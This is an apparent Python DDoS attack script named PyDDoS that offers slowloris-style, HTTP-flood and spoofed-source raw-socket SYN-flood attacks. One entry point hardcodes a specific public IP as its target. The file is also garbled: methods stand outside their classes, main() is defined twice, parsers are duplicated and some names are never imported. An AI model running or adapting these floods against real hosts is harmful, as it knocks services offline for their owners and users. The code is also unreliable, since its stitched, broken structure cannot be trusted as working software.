# Banner function
def show_banner():
    banner = r"""
version = '1.0'

	 ██▓███ ▓██   ██▓▓█████▄ ▓█████▄  ▒█████    ██████ 
	▓██░  ██▒▒██  ██▒▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
	▓██░ ██▓▒ ▒██ ██░░██   █▌░██   █▌▒██░  ██▒░ ▓██▄   
	▒██▄█▓▒ ▒ ░ ▐██▓░░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒
	▒██▒ ░  ░ ░ ██▒▓░░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒
	▒▓▒░ ░  ░  ██▒▒▒  ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
	░▒ ░     ▓██ ░▒░  ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
	░░       ▒ ▒ ░░   ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
	         ░ ░        ░       ░        ░ ░        ░  
	         ░ ░      ░       ░                        

	DDos python script | Script used for testing ddos | Ddos attack
	Author: DirtyHeroes
	Github: https://github.com/palacita135/PyDDoS-supreme

	root@kali: python3 pyddos.py --help <for option>

"""
    print(banner)

# Ensure this runs before parsing arguments
show_banner()

import urllib.parse
import http.client
import random
import argparse
import signal
import string
import time
import json
import sys
import os
import re
import shutil
import struct
import threading
from termcolor import cprint
from argparse import ArgumentParser, RawTextHelpFormatter
from socket import socket, inet_aton, AF_INET, SOCK_RAW, IPPROTO_TCP, IPPROTO_IP, IP_HDRINCL, gethostbyname
from threading import Thread, Lock
from struct import pack
from random import randrange

# Check if pip is installed and upgrade it if needed
if not shutil.which("pip"):
    os.system("python3 -m ensurepip && python3 -m pip install --upgrade pip")

# Try to import necessary modules
try:
    import requests
    import colorama
    from termcolor import colored, cprint
except ImportError:
    print("[!] Missing dependencies. Installing now...")

    try:
        os.system('pip install --upgrade colorama termcolor requests')

        print("[+] Installed necessary modules. Restart the script.")
        sys.exit(0)

    except Exception as e:
        print(f"[-] Installation failed: {e}")
        sys.exit(1)

# Initialize colorama for color support
colorama.init()

def fake_ip():
    """Generate a random, non-loopback IP address."""
    while True:
        ip_parts = [str(randrange(0, 256)) for _ in range(4)]
        if ip_parts[0] != "127":  # Avoid loopback IPs
            return '.'.join(ip_parts)

def check_tgt(args):
    """Resolve target hostname to IP address."""
    try:
        return gethostbyname(args.d)
    except Exception:
        sys.exit(cprint("[-] Can't resolve host: Unknown host!", "red"))

def add_useragent():
    """Load User-Agent strings from a file."""
    useragent_file = "/home/whoami/Pyddos/ua.txt"
    try:
        with open(useragent_file, "r") as fp:
            return [line.strip() for line in fp if line.strip()]
    except FileNotFoundError:
        cprint("[-] No file named 'ua.txt', failed to load User-Agents", "yellow")
        return []  # Return empty list if file not found

def add_bots():
    """Return a list of bot search engine URLs."""
    return [
        "http://www.bing.com/search?q=%40&count=50&first=0",
        "http://www.google.com/search?hl=en&num=100&q=intext%3A%40&ie=utf-8"
    ]


class Pyslow:
    def __init__(self, tgt, port, to, threads, sleep):
        self.tgt = str(tgt)
        self.port = int(port)  # Ensure port is an integer
        self.to = float(to)  # Timeout should be a float
        self.threads = int(threads)  # Ensure threads is an integer
        self.sleep = float(sleep)  # Sleep should be a float
        
        self.method = ['GET', 'POST']
        self.pkt_count = 0  # Packet counter
        
        # Optionally, include a predefined User-Agent list
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
            "Mozilla/5.0 (Linux; Android 10; Mobile)"
        ]


def mypkt(self):
    text = (
        f"{random.choice(self.method)} /{random.randint(1, 999999999)} HTTP/1.1\r\n"
        f"Host: {self.tgt}\r\n"
        f"User-Agent: {random.choice(self.add_useragent())}\r\n"
        "Content-Length: 42\r\n\r\n"
    )
    pkt = text.encode()  # Convert string to bytes
    return pkt

def building_socket(self):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
        sock.settimeout(self.to)
        sock.connect((self.tgt, int(self.port)))
        
        if sock:
            sock.sendall(self.mypkt())  # Use sendall() instead of sendto()
            self.pkt_count += 1
        
        return sock
    
    except KeyboardInterrupt:
        sys.exit(cprint('[-] Canceled by user', 'red'))
    
    except Exception as e:
        cprint(f"[!] Failed to build socket: {e}", "red")
        return None

def sending_packets(self):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
        sock.settimeout(self.to)
        sock.connect((self.tgt, int(self.port)))
        self.pkt_count += 3

        if sock:
            sock.sendall(b'X-a: b\r\n')  # Fixed encoding issue
            self.pkt_count += 1  # Was `self.pkt` which is undefined

    except KeyboardInterrupt:
        sys.exit(cprint('[-] Canceled by user', 'red'))

    except Exception as e:
        cprint(f"[!] Connection failed: {e}", "red")
        return None  # Instead of retrying blindly, return None

    return sock

def doconnection(self):
    socks = 0
    fail = 0
    lsocks = []
    lhandlers = []
    
    cprint('\t\tBuilding sockets', 'blue')
    
    while socks < int(self.threads):
        try:
            sock = self.building_socket()
            if sock:
                lsocks.append(sock)
                socks += 1
        except Exception as e:
            fail += 1
            cprint(f"[!] Failed to build socket ({fail} failures): {e}", "red")
        except KeyboardInterrupt:
            sys.exit(cprint('[-] Canceled by user', 'red'))

    cprint('\t\tSending packets', 'blue')

    while socks < int(self.threads):
        try:
            handler = self.sending_packets()
            if handler:
                lhandlers.append(handler)
                socks += 1
        except Exception as e:
            fail += 1
            cprint(f"[!] Failed to send packet ({fail} failures): {e}", "red")
        except KeyboardInterrupt:
            sys.exit(cprint('[-] Canceled by user', 'red'))
    
    cprint(f"I have sent {colored(str(self.pkt_count), 'cyan')} packets successfully.", "green")
    cprint(f"Now I'm going to sleep for {colored(self.sleep, 'red')} seconds.", "green")

    time.sleep(self.sleep)


class Requester(Thread):
    def __init__(self, tgt):
        super().__init__()
        self.tgt = tgt
        self.port = None
        self.ssl = False
        self.req = []
        self.lock = Lock()
        self.response_counts = defaultdict(int)  # ✅ Stores response code counts

        # Parse the URL
        url_type = urllib.parse.urlparse(self.tgt)
        if url_type.scheme == 'https':
            self.ssl = True
            self.port = 443
        else:
            self.port = 80

    def run(self):
        try:
            if self.ssl:
                conn = http.client.HTTPSConnection(self.tgt, self.port)
            else:
                conn = http.client.HTTPConnection(self.tgt, self.port)
            
            self.req.append(conn)

            for reqter in self.req:
                url, http_header = self.data()
                method = choice(['GET', 'POST'])
                reqter.request(method.upper(), url, None, http_header)
                
                response = reqter.getresponse()
                status_code = response.status  # ✅ Get HTTP response code
                
                with self.lock:  # ✅ Thread-safe increment
                    self.response_counts[status_code] += 1

                print(f"[Thread-{self.name}] Response: {status_code}")  # ✅ Debug output

        except KeyboardInterrupt:
            sys.exit(cprint('[-] Canceled by user', 'red'))
        except Exception as e:
            print(e)
        finally:
            self.closeConnections()

    def closeConnections(self):
        for conn in self.req:
            try:
                conn.close()
            except:
                pass


def header(self):
    """Generate randomized HTTP headers."""
    
    cachetype = [
        'no-cache', 'no-store', f'max-age={random.randint(0, 10)}',
        f'max-stale={random.randint(0, 100)}', f'min-fresh={random.randint(0, 10)}',
        'notransform', 'only-if-cache'
    ]
    
    accept_encodings = [
        'compress,gzip', '*', '',
        'compress;q=0.5, gzip;q=1.0',
        'gzip;q=1.0, identity;q=0.5, *;q=0'
    ]
    
    # Load bot URLs and User-Agents, ensuring non-empty lists
    bot_list = add_bots() or ["http://example.com"]  # Fallback to a default
    user_agents = add_useragent() or ["Mozilla/5.0"]  # Fallback to a default
    
    # Construct HTTP headers
    http_header = {
        'User-Agent': random.choice(user_agents),
        'Cache-Control': random.choice(cachetype),
        'Accept-Encoding': random.choice(accept_encodings),
        'Keep-Alive': '42',
        'Host': self.tgt,
        'Referer': random.choice(bot_list)
    }
    
    return http_header

def rand_str(self):
    """Generate a randomized query string with 3 parameters."""
    return '&'.join(
        ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(7, 14)))
        for _ in range(3)
    )

def create_url(self):
    """Generate a randomized URL with query parameters."""
    return f"{self.tgt}?{self.rand_str()}"

def data(self):
    """Generate a request URL and headers."""
    return self.create_url(), self.header() or {}  # Ensure headers are always valid

def run(self):
    """Execute the HTTP flood attack."""
    try:
        if self.ssl:
            conn = http.client.HTTPSConnection(self.tgt, self.port)
        else:
            conn = http.client.HTTPConnection(self.tgt, self.port)

        self.req.append(conn)  # ✅ Now only storing the correct connection type

        for reqter in self.req:
            url, http_header = self.data()
            method = random.choice(['GET', 'POST'])  # ✅ Ensure uppercase below
            reqter.request(method, url, None, http_header)

    except KeyboardInterrupt:
        sys.exit(cprint('[-] Canceled by user', 'red'))
    except Exception as e:
        print(f"[ERROR] {e}")
    finally:
        self.closeConnections()

def closeConnections(self):
    """Close all active connections safely."""
    for conn in self.req:
        try:
            conn.close()
        except Exception as e:
            print(f"[WARNING] Failed to close connection: {e}")

class Synflood(threading.Thread):
    def __init__(self, tgt, ip, sock=None):
        super().__init__()

        self.tgt = tgt
        self.ip = ip
        self.psh = b''  # Ensure it's bytes

        if sock is None:
            self.sock = socket.socket(AF_INET, SOCK_RAW, IPPROTO_TCP)
            self.sock.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
        else:
            self.sock = sock

    def checksum(self, data):
        """Compute the Internet Checksum for a given data."""
        s = 0
        if len(data) % 2 != 0:
            data += b"\x00"  # Ensure even length

        for i in range(0, len(data), 2):
            w = (data[i] << 8) + data[i + 1]
            s = s + w

        s = (s >> 16) + (s & 0xffff)
        s = (s >> 16) + s  # Handle carry
        return ~s & 0xffff

    def build_packet(self):
        """Build a SYN packet with a fake IP and TCP header."""
        # IP Header
        ihl_version = (4 << 4) | 5  # IPv4 + IHL=5
        tos = 0
        tot_len = 40  # Header size only
        ip_id = random.randint(1024, 65535)
        frag_off = 0
        ttl = 64
        protocol = IPPROTO_TCP
        check = 0
        s_addr = inet_aton(self.ip)
        d_addr = inet_aton(self.tgt)

        ip_header = struct.pack(
            "!BBHHHBBH4s4s",
            ihl_version,
            tos,
            tot_len,
            ip_id,
            frag_off,
            ttl,
            protocol,
            check,
            s_addr,
            d_addr
        )

        # TCP Header
        source = random.randint(1024, 65535)  # Random source port
        dest = 80
        seq = random.randint(0, 4294967295)  # Random sequence number
        ack_seq = 0
        doff = 5  # Data offset (5 words, no options)
        flags = 0b000010  # SYN flag set
        window = 5840
        check = 0
        urg_ptr = 0

        tcp_header = struct.pack(
            "!HHLLBBHHH",
            source,
            dest,
            seq,
            ack_seq,
            (doff << 4),
            flags,
            window,
            check,
            urg_ptr
        )

        # Pseudo Header for TCP Checksum Calculation
        placeholder = 0
        tcp_length = len(tcp_header)
        self.psh = struct.pack(
            "!4s4sBBH",
            s_addr,
            d_addr,
            placeholder,
            protocol,
            tcp_length
        ) + tcp_header

        # Compute Checksum
        tcp_checksum = self.checksum(self.psh)

        # Final TCP Header with Correct Checksum
        tcp_header = struct.pack(
            "!HHLLBBHHH",
            source,
            dest,
            seq,
            ack_seq,
            (doff << 4),
            flags,
            window,
            tcp_checksum,
            urg_ptr
        )

        # Full Packet (IP Header + TCP Header)
        packet = ip_header + tcp_header
        return packet

    def run(self):
        """Run the attack and send packets in a loop."""
        while True:
            packet = self.build_packet()
            try:
                self.sock.sendto(packet, (self.tgt, 0))
                print(f"[*] Sent SYN to {self.tgt} from {self.ip}")
            except KeyboardInterrupt:
                print("[-] Attack stopped by user")
                break
            except Exception as e:
                print(f"[ERROR] {e}")

def main():
    if os.geteuid() != 0:
        print("[-] Root privileges are required!")
        sys.exit(1)

    target = "36.86.63.182"  # Replace with your target
    threads = 500  # Number of attack threads

    synsock = socket.socket(AF_INET, SOCK_RAW, IPPROTO_TCP)
    synsock.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)

    print(f"[*] Starting SYN Flood on: {target}")

    for _ in range(threads):
        fake_ip = ".".join(str(random.randint(1, 255)) for _ in range(4))
        thread = Synflood(target, fake_ip, sock=synsock)
        thread.daemon = True
        thread.start()

    try:
        while True:
            pass  # Keep script running
    except KeyboardInterrupt:
        print("[-] Attack stopped by user")

def main():
    parser = ArgumentParser(
        usage="python3 pyddos.py -d <target> [-p <port>] [-T <threads>] [attack type]",
        formatter_class=RawTextHelpFormatter,  # ✅ Fixed
        prog="pyddos",
        description="Pyddos - A Python-based DDoS testing tool for stress-testing your own servers.",
        epilog=("""
        Examples:
        python3 pyddos.py -d www.example.com -p 80 -T 2000 -Pyslow
        python3 pyddos.py -d www.domain.com -s 100 -Request
        python3 pyddos.py -d www.google.com -Synflood -T 5000 -t 10.0
        """)
    )

    parser.add_argument("-d", "--destination", required=True, help="Target domain or IP")
    parser.add_argument("-p", "--port", type=int, default=80, help="Port number (default: 80)")
    parser.add_argument("-T", "--threads", type=int, default=500, help="Number of threads")
    parser.add_argument("-t", "--timeout", type=float, default=5.0, help="Socket timeout (default: 5s)")
    parser.add_argument("attack", choices=["Pyslow", "Request", "Synflood"], help="Attack method")

    args = parser.parse_args()

    cprint(f"[+] Target: {args.destination} | Port: {args.port} | Threads: {args.threads} | Attack: {args.attack}", "green")

    if args.attack == "Synflood":
        for _ in range(args.threads):
            spoof_ip = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
            thread = Synflood(args.destination, spoof_ip)
            thread.start()

# Define parser
parser = argparse.ArgumentParser(description="Pyddos - DDoS Attack Simulation Tool")
options = parser.add_argument_group('options', '')

# Add Arguments
options.add_argument('-d', metavar='<ip|domain>', required=True, help='Specify your target IP or domain')
options.add_argument('-t', metavar='<float>', default=5.0, help='Set timeout for socket')
options.add_argument('-T', metavar='<int>', default=1000, help='Set number of threads (default = 1000)')
options.add_argument('-p', metavar='<int>', default=80, help='Specify target port (only for Pyslow attack)')
options.add_argument('-s', metavar='<int>', default=100, help='Set sleep time for reconnection')
options.add_argument('-i', metavar='<ip address>', help='Specify a spoofed IP')
options.add_argument('-Request', action='store_true', help='Enable request attack')
options.add_argument('-Synflood', action='store_true', help='Enable SYN flood attack')
options.add_argument('-Pyslow', action='store_true', help='Enable Pyslow attack')
options.add_argument('--fakeip', action='store_true', help='Create a fake IP if spoofed IP is not specified')

# Placeholder functions
def add_bots():
    return [
        "https://www.google.com/",
        "https://www.bing.com/",
        "https://www.yahoo.com/",
        "https://www.duckduckgo.com/"
    ]

def add_useragent():
    return [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    ]

# Argument parsing (assuming parser is defined)
args = parser.parse_args()

def check_tgt(args):
    """Returns the target IP or domain."""
    return args.d  # ✅ FIXED: Using correct argument name

def fake_ip():
    """Generate a valid random spoofed IP address (avoiding private & reserved ranges)."""
    while True:
        ip = ".".join(str(random.randint(1, 255)) for _ in range(4))
        # Avoid private/reserved IP ranges
        octets = list(map(int, ip.split(".")))
        if (
            (octets[0] == 10) or  # 10.0.0.0/8
            (octets[0] == 172 and 16 <= octets[1] <= 31) or  # 172.16.0.0/12
            (octets[0] == 192 and octets[1] == 168) or  # 192.168.0.0/16
            (octets[0] == 127)  # Loopback
        ):
            continue
        return ip  # ✅ Returns only valid public IPs

# Example usage
target = check_tgt(args)
print(f"Target: {target}")
print(f"Fake IP: {fake_ip()}")
print(f"Random User-Agent: {random.choice(add_useragent())}")
print(f"Random Referer: {random.choice(add_bots())}")

# Check for root privileges
if args.Synflood:
    if os.geteuid() != 0:
        sys.exit(cprint('[-] You do not have root permissions!', 'red'))

    tgt = check_tgt(args)
    synsock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)
    synsock.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)

    print(colored('[*] Starting SYN Flood on: ', 'blue') + colored(tgt, 'red'))

    max_threads = int(args.T)  # Number of attack threads
    active_threads = []

    try:
        while True:
            ip = fake_ip() if not args.i else args.i

            # Only spawn new threads if we haven't hit the max limit
            if len(active_threads) < max_threads:
                thread = Synflood(tgt, ip, sock=synsock)
                thread.daemon = True
                thread.start()
                active_threads.append(thread)

            # Remove finished threads from the list
            active_threads = [t for t in active_threads if t.is_alive()]

            # Throttle the loop slightly to prevent CPU exhaustion
            time.sleep(0.1)

    except KeyboardInterrupt:
        sys.exit(cprint('[-] Canceled by user', 'red'))

elif args.Request:
    tgt = args.d
    threads = []
    print(colored('[*] Sending requests to: ', 'blue') + colored(tgt, 'red'))

    try:
        while True:
            # Spawn new threads up to the max limit
            while len(threads) < int(args.T):
                t = Requester(tgt)
                t.daemon = True
                t.start()
                threads.append(t)

            # Remove dead threads to prevent memory leaks
            threads = [t for t in threads if t.is_alive()]

            # Prevent CPU exhaustion
            time.sleep(0.1)

    except KeyboardInterrupt:
        sys.exit(cprint('[-] Canceled by user', 'red'))

elif args.Pyslow:
    try:
        tgt = args.d
        port = args.p
        to = float(args.t)
        st = int(args.s)
        threads = int(args.T)
    except Exception as e:
        sys.exit(cprint(f"[-] Error parsing arguments: {e}", 'red'))

    print(colored(f"[*] Starting Pyslow Attack on {tgt}:{port} with {threads} threads", "blue"))

    thread_list = []

    try:
        # Spawn all threads
        for _ in range(threads):
            worker = Pyslow(tgt, port, to, threads, st)
            worker.daemon = True  # Make thread exit when the script stops
            worker.start()
            thread_list.append(worker)

        # Keep threads alive
        for thread in thread_list:
            thread.join()
    
    except KeyboardInterrupt:
        sys.exit(cprint('[-] Canceled by user', 'red'))

# Main Execution
if __name__ == "__main__":
    print(colored("[*] PyDDOS Attack Script Started", "blue"))

if __name__ == "__main__":
    main()
